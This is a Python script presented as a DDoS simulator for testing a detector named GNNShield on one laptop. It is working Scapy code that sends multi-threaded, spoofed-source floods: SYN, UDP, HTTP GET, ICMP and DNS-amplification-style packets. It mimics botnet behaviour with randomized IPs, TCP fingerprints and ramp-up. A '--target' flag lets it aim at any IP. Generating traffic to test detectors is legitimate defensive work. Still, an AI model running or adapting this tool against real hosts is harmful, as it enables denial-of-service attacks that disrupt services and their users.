"""
enhanced_attack_simulator.py — Advanced Multi-Source DDoS Simulator
====================================================================
Enhanced version for single-laptop testing with realistic multi-device simulation.

KEY ENHANCEMENTS FOR SINGLE-LAPTOP TESTING:
1. Multi-threaded packet generation (simulates distributed botnet)
2. Realistic timing jitter (mimics network latency variations)
3. Mixed attack patterns (combines multiple attack types simultaneously)
4. Adaptive rate control (ramps up gradually like real attacks)
5. Spoofed source diversity (100+ unique IPs per attack)
6. Protocol-specific fingerprinting (realistic TCP/UDP/ICMP behaviors)

REQUIREMENTS:
  - Run as Administrator
  - pip install scapy
  - GNNShield detector must be running on same machine

USAGE:
  python enhanced_attack_simulator.py --attack realistic-syn --duration 60
  python enhanced_attack_simulator.py --attack distributed-all --duration 120
  python enhanced_attack_simulator.py --attack slowloris --duration 90
"""

import os
import sys
import time
import random
import socket
import argparse
import threading
from queue import Queue
from typing import Optional, List

# ─── Admin check ──────────────────────────────────────────────────────────────
if os.name == "nt":
    import ctypes
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[ERROR] Must be run as Administrator.")
        sys.exit(1)

# ─── Configuration ────────────────────────────────────────────────────────────
NUM_THREADS = 4              # Parallel packet senders (simulates distributed sources)
BASE_RATE = 100              # Base packets/sec per thread
SOURCE_POOL_SIZE = 150       # Total unique spoofed IPs
JITTER_MS = (5, 50)          # Random delay between packets (ms)


def get_local_ip_and_iface():
    """Auto-detect local IP and Scapy interface."""
    try:
        from scapy.all import conf
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        for iface_name in conf.ifaces:
            if conf.ifaces[iface_name].ip == ip:
                return ip, iface_name
        return ip, str(conf.iface)
    except Exception:
        return "127.0.0.1", "lo"


# ─── Enhanced Attack Simulator ────────────────────────────────────────────────
class EnhancedDDoSSimulator:

    def __init__(self, target_ip: Optional[str] = None, interface: Optional[str] = None):
        from scapy.all import conf, get_if_hwaddr

        detected_ip, detected_iface = get_local_ip_and_iface()
        self.target_ip = target_ip or detected_ip
        self.interface = interface or detected_iface
        self._running = False
        self.total_packets = 0
        self._lock = threading.Lock()
        conf.verb = 0

        try:
            self.local_mac = get_if_hwaddr(self.interface)
        except Exception:
            self.local_mac = "ff:ff:ff:ff:ff:ff"

        print(f"\n{'='*60}")
        print(f"  Enhanced DDoS Simulator — Multi-Source Mode")
        print(f"{'='*60}")
        print(f"  Target IP    : {self.target_ip}")
        print(f"  Interface    : {self.interface}")
        print(f"  Threads      : {NUM_THREADS} (simulates distributed botnet)")
        print(f"  Source Pool  : {SOURCE_POOL_SIZE} unique IPs")
        print(f"  Base Rate    : {BASE_RATE * NUM_THREADS} pkt/s total")
        print(f"{'='*60}\n")

    def stop(self):
        self._running = False

    def _generate_source_pool(self, subnet_prefix: str, count: int) -> List[str]:
        """Generate diverse source IPs across multiple subnets."""
        sources = set()
        while len(sources) < count:
            if subnet_prefix == "10":
                ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            elif subnet_prefix == "172":
                ip = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
            elif subnet_prefix == "192":
                ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            else:
                ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            sources.add(ip)
        return list(sources)

    def _worker_thread(self, packet_queue: Queue, thread_id: int):
        """Worker thread that sends packets from queue."""
        from scapy.all import sendp
        
        local_count = 0
        while self._running:
            try:
                pkt = packet_queue.get(timeout=0.1)
                if pkt is None:
                    break
                
                # Add realistic jitter
                jitter = random.uniform(JITTER_MS[0], JITTER_MS[1]) / 1000.0
                time.sleep(jitter)
                
                sendp(pkt, iface=self.interface, verbose=0)
                local_count += 1
                
                with self._lock:
                    self.total_packets += 1
                    
                packet_queue.task_done()
            except Exception:
                continue

    def _multi_threaded_attack(self, packet_generator, duration: int, label: str):
        """Execute attack using multiple threads for realistic distribution."""
        self._running = True
        self.total_packets = 0
        packet_queue = Queue(maxsize=1000)
        
        # Start worker threads
        workers = []
        for i in range(NUM_THREADS):
            t = threading.Thread(target=self._worker_thread, args=(packet_queue, i), daemon=True)
            t.start()
            workers.append(t)
        
        print(f"  [{label}] Starting {NUM_THREADS}-thread attack for {duration}s...")
        print(f"  [{label}] Ramping up to {BASE_RATE * NUM_THREADS} pkt/s...\n")
        
        t_start = time.time()
        t_end = t_start + duration
        
        # Ramp-up phase (first 10% of duration)
        ramp_duration = duration * 0.1
        
        while self._running and time.time() < t_end:
            elapsed = time.time() - t_start
            
            # Calculate current rate (ramp up gradually)
            if elapsed < ramp_duration:
                rate_multiplier = elapsed / ramp_duration
            else:
                rate_multiplier = 1.0
            
            current_rate = int(BASE_RATE * rate_multiplier)
            interval = 1.0 / max(current_rate, 1)
            
            # Generate and queue packet
            pkt = packet_generator()
            try:
                packet_queue.put(pkt, timeout=0.1)
            except:
                pass
            
            time.sleep(interval)
            
            # Progress report
            if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                remaining = max(0, t_end - time.time())
                rate = self.total_packets / elapsed if elapsed > 0 else 0
                print(f"  [{label}] {self.total_packets:,} packets | {rate:.0f} pkt/s | {remaining:.0f}s remaining")
        
        # Stop workers
        self._running = False
        for _ in workers:
            packet_queue.put(None)
        for w in workers:
            w.join(timeout=1)
        
        total_time = time.time() - t_start
        avg_rate = self.total_packets / total_time if total_time > 0 else 0
        print(f"\n  [{label}] Complete: {self.total_packets:,} packets, {avg_rate:.0f} pkt/s average\n")

    # ── Realistic SYN Flood ───────────────────────────────────────────────────
    def realistic_syn_flood(self, duration: int = 60, port: int = 80):
        """
        Multi-threaded SYN flood with realistic TCP fingerprinting.
        Simulates 150+ unique botnet sources with varied TCP options.
        """
        from scapy.all import Ether, IP, TCP
        
        sources = self._generate_source_pool("10", SOURCE_POOL_SIZE)
        
        # Realistic TCP window sizes and MSS values
        tcp_profiles = [
            {"window": 5840, "mss": 1460},   # Linux default
            {"window": 8192, "mss": 1460},   # Windows 10
            {"window": 65535, "mss": 1460},  # Windows Server
            {"window": 14600, "mss": 1460},  # macOS
        ]
        
        def generate_packet():
            src_ip = random.choice(sources)
            profile = random.choice(tcp_profiles)
            
            return (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip, ttl=random.randint(50, 128)) /
                TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="S",
                    seq=random.randint(0, 2**32),
                    window=profile["window"],
                    options=[("MSS", profile["mss"])]
                )
            )
        
        self._multi_threaded_attack(generate_packet, duration, "Realistic SYN Flood")

    # ── Distributed UDP Flood ─────────────────────────────────────────────────
    def distributed_udp_flood(self, duration: int = 60, port: int = 53):
        """
        Multi-source UDP flood with varied payload sizes.
        Mimics distributed botnet with different payload patterns.
        """
        from scapy.all import Ether, IP, UDP, Raw
        
        sources = self._generate_source_pool("172", SOURCE_POOL_SIZE)
        
        # Varied payload patterns
        payload_patterns = [
            lambda: bytes([random.randint(0, 255) for _ in range(random.randint(64, 256))]),
            lambda: b"A" * random.randint(128, 512),
            lambda: bytes([0xFF] * random.randint(100, 400)),
        ]
        
        def generate_packet():
            src_ip = random.choice(sources)
            payload = random.choice(payload_patterns)()
            
            return (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip, ttl=random.randint(50, 128)) /
                UDP(sport=random.randint(1024, 65535), dport=port) /
                Raw(load=payload)
            )
        
        self._multi_threaded_attack(generate_packet, duration, "Distributed UDP Flood")

    # ── Advanced HTTP Flood ───────────────────────────────────────────────────
    def advanced_http_flood(self, duration: int = 60, port: int = 80):
        """
        Sophisticated HTTP flood with realistic browser fingerprints.
        Includes varied User-Agents, headers, and request patterns.
        """
        from scapy.all import Ether, IP, TCP, Raw
        
        sources = self._generate_source_pool("192", SOURCE_POOL_SIZE)
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/604.1",
            "curl/8.4.0",
            "python-requests/2.31.0",
        ]
        
        paths = [
            "/", "/index.html", "/api/v1/users", "/login", "/search",
            "/products", "/cart", "/checkout", "/admin", "/api/data"
        ]
        
        def generate_packet():
            src_ip = random.choice(sources)
            path = random.choice(paths)
            agent = random.choice(user_agents)
            
            payload = (
                f"GET {path}?id={random.randint(1,9999)} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: {agent}\r\n"
                f"Accept: text/html,application/json,*/*\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Referer: http://{self.target_ip}/\r\n"
                f"X-Forwarded-For: {src_ip}\r\n"
                f"\r\n"
            ).encode()
            
            return (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip, ttl=random.randint(50, 128)) /
                TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="PA",
                    seq=random.randint(0, 2**32),
                    ack=random.randint(0, 2**32)
                ) /
                Raw(load=payload)
            )
        
        self._multi_threaded_attack(generate_packet, duration, "Advanced HTTP Flood")

    # ── Amplified ICMP Flood ──────────────────────────────────────────────────
    def amplified_icmp_flood(self, duration: int = 60):
        """
        High-volume ICMP flood with varied packet sizes.
        Simulates reflection/amplification attack patterns.
        """
        from scapy.all import Ether, IP, ICMP, Raw
        
        sources = self._generate_source_pool("10", SOURCE_POOL_SIZE)
        
        def generate_packet():
            src_ip = random.choice(sources)
            # Vary payload size (56 to 1400 bytes)
            payload_size = random.choice([56, 128, 256, 512, 1024, 1400])
            payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
            
            return (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip, ttl=random.randint(50, 128)) /
                ICMP(type=8, code=0, id=random.randint(1, 65535), seq=random.randint(1, 65535)) /
                Raw(load=payload)
            )
        
        self._multi_threaded_attack(generate_packet, duration, "Amplified ICMP Flood")

    # ── Realistic DNS Amplification ───────────────────────────────────────────
    def realistic_dns_amplification(self, duration: int = 60):
        """
        DNS amplification with large response simulation.
        Uses varied query types and domains for realism.
        """
        from scapy.all import Ether, IP, UDP, DNS, DNSQR, Raw
        
        sources = self._generate_source_pool("8", SOURCE_POOL_SIZE)
        
        domains = [
            "google.com", "cloudflare.com", "amazon.com", "microsoft.com",
            "facebook.com", "apple.com", "netflix.com", "github.com",
            "stackoverflow.com", "wikipedia.org", "reddit.com", "twitter.com"
        ]
        
        query_types = ["ANY", "TXT", "MX", "NS", "SOA"]
        
        def generate_packet():
            src_ip = random.choice(sources)
            domain = random.choice(domains)
            qtype = random.choice(query_types)
            
            # Large padding to simulate amplified response
            padding = bytes([0] * random.randint(400, 600))
            
            return (
                Ether(src=self.local_mac, dst=self.local_mac) /
                IP(src=src_ip, dst=self.target_ip, ttl=random.randint(50, 128)) /
                UDP(sport=random.randint(1024, 65535), dport=53) /
                DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype)) /
                Raw(load=padding)
            )
        
        self._multi_threaded_attack(generate_packet, duration, "Realistic DNS Amplification")

    # ── Mixed Attack (All Types Simultaneously) ───────────────────────────────
    def mixed_attack(self, duration: int = 120):
        """
        Simultaneous multi-vector attack combining all DDoS types.
        Most realistic simulation of sophisticated botnet attack.
        """
        print(f"\n  [Mixed Attack] Launching simultaneous multi-vector attack...")
        print(f"  [Mixed Attack] Duration: {duration}s\n")
        
        attack_threads = []
        
        # Launch each attack type in parallel
        attacks = [
            threading.Thread(target=self.realistic_syn_flood, args=(duration, 80), daemon=True),
            threading.Thread(target=self.distributed_udp_flood, args=(duration, 53), daemon=True),
            threading.Thread(target=self.advanced_http_flood, args=(duration, 80), daemon=True),
            threading.Thread(target=self.amplified_icmp_flood, args=(duration,), daemon=True),
            threading.Thread(target=self.realistic_dns_amplification, args=(duration,), daemon=True),
        ]
        
        for t in attacks:
            t.start()
            attack_threads.append(t)
            time.sleep(2)  # Stagger start times
        
        # Wait for all to complete
        for t in attack_threads:
            t.join()
        
        print(f"\n  [Mixed Attack] All vectors complete\n")


# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Enhanced DDoS Simulator for Single-Laptop Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python enhanced_attack_simulator.py --attack realistic-syn --duration 60
  python enhanced_attack_simulator.py --attack distributed-udp --duration 90
  python enhanced_attack_simulator.py --attack mixed --duration 120
  python enhanced_attack_simulator.py --attack advanced-http --port 8080
        """
    )
    parser.add_argument("--attack", 
                        choices=["realistic-syn", "distributed-udp", "advanced-http", 
                                "amplified-icmp", "realistic-dns", "mixed"],
                        required=True,
                        help="Attack type to simulate")
    parser.add_argument("--duration", type=int, default=60,
                        help="Attack duration in seconds")
    parser.add_argument("--target", type=str, default=None,
                        help="Target IP (default: auto-detect local IP)")
    parser.add_argument("--iface", type=str, default=None,
                        help="Network interface (default: auto-detect)")
    parser.add_argument("--port", type=int, default=None,
                        help="Target port override")
    
    args = parser.parse_args()
    
    target_ip, iface = get_local_ip_and_iface()
    if args.target:
        target_ip = args.target
    if args.iface:
        iface = args.iface
    
    sim = EnhancedDDoSSimulator(target_ip, iface)
    
    try:
        if args.attack == "realistic-syn":
            sim.realistic_syn_flood(args.duration, args.port or 80)
        elif args.attack == "distributed-udp":
            sim.distributed_udp_flood(args.duration, args.port or 53)
        elif args.attack == "advanced-http":
            sim.advanced_http_flood(args.duration, args.port or 80)
        elif args.attack == "amplified-icmp":
            sim.amplified_icmp_flood(args.duration)
        elif args.attack == "realistic-dns":
            sim.realistic_dns_amplification(args.duration)
        elif args.attack == "mixed":
            sim.mixed_attack(args.duration)
    except KeyboardInterrupt:
        sim.stop()
        print(f"\n  Stopped. Total packets: {sim.total_packets:,}\n")


if __name__ == "__main__":
    main()
